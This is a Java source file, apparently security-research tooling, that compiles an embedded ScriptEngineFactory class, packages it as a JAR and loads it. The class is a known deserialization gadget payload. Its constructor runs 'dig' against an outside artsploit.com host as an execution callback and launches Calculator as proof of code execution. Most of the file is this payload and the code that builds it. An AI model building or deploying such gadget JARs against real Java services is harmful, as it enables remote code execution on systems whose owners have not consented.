package src.main.LoadLib.JARLoad;

import javax.tools.*;
import java.io.*;
import java.net.URI;
import java.util.Arrays;

public class LoadJarLib {
//    用来编译jar包，先放着还没想好怎么用
    public static void main(String[] args) throws Exception {
        // Step 1: Java source code as a String
        String javaCode = "import javax.script.ScriptEngine;\n" +
                "import javax.script.ScriptEngineFactory;\n" +
                "import java.io.IOException;\n" +
                "import java.util.List;\n\n" +
                "public class AwesomeScriptEngineFactory implements ScriptEngineFactory {\n\n" +
                "    public AwesomeScriptEngineFactory() {\n" +
                "        try {\n" +
                "            Runtime.getRuntime().exec(\"dig scriptengine.x.artsploit.com\");\n" +
                "            Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\");\n" +
                "        } catch (IOException e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getEngineName() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getEngineVersion() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public List<String> getExtensions() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public List<String> getMimeTypes() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public List<String> getNames() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getLanguageName() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getLanguageVersion() {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public Object getParameter(String key) {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getMethodCallSyntax(String obj, String m, String... args) {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getOutputStatement(String toDisplay) {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public String getProgram(String... statements) {\n" +
                "        return null;\n" +
                "    }\n\n" +
                "    @Override\n" +
                "    public ScriptEngine getScriptEngine() {\n" +
                "        return null;\n" +
                "    }\n" +
                "}";

        // Step 2: Create an in-memory Java file
        JavaFileObject fileObject = new JavaSourceFromString("AwesomeScriptEngineFactory", javaCode);

        // Step 3: Get the Java compiler
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

        // Step 4: Compile the code
        DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();
        StandardJavaFileManager fileManager = compiler.getStandardFileManager(diagnostics, null, null);
        JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, diagnostics, null, null, Arrays.asList(fileObject));

        // If compilation fails, output diagnostics
        if (!task.call()) {
            for (Diagnostic<?> diagnostic : diagnostics.getDiagnostics()) {
                System.out.println(diagnostic.getMessage(null));
            }
            return;
        }

        // Step 5: Create the JAR file using the compiled class
        createJar("AwesomeScriptEngineFactory.class", "AwesomeScriptEngineFactory.jar");

        // Step 6: Load the compiled class
        ClassLoader classLoader = LoadJarLib.class.getClassLoader();
        Class<?> clazz = classLoader.loadClass("AwesomeScriptEngineFactory");

        // Step 7: Create an instance and execute the constructor
        Object instance = clazz.getDeclaredConstructor().newInstance();
    }

    // Helper method to create a JAR file with a manifest
    private static void createJar(String classFile, String jarFile) throws IOException, InterruptedException {
        // Create MANIFEST.MF with Main-Class entry
        File manifestFile = new File("MANIFEST.MF");
        try (PrintWriter writer = new PrintWriter(manifestFile)) {
            writer.println("Manifest-Version: 1.0");
            writer.println("Main-Class: LoadJarLib");
        }

        // Use ProcessBuilder to create JAR file with manifest
        ProcessBuilder pb = new ProcessBuilder(
                "jar", "cfm", jarFile, "MANIFEST.MF", classFile);
        pb.inheritIO(); // To see output in console
        Process process = pb.start();
        int result = process.waitFor();
        if (result == 0) {
            System.out.println("JAR created successfully: " + jarFile);
        } else {
            System.out.println("Failed to create JAR.");
        }

        // Clean up
        manifestFile.delete();
    }
}

// Helper class to convert String to a Java source file object
class JavaSourceFromString extends SimpleJavaFileObject {
    final String code;

    JavaSourceFromString(String name, String code) {
        super(URI.create("string:///" + name.replace('.', '/') + Kind.SOURCE.extension), Kind.SOURCE);
        this.code = code;
    }

    @Override
    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
        return code;
    }
}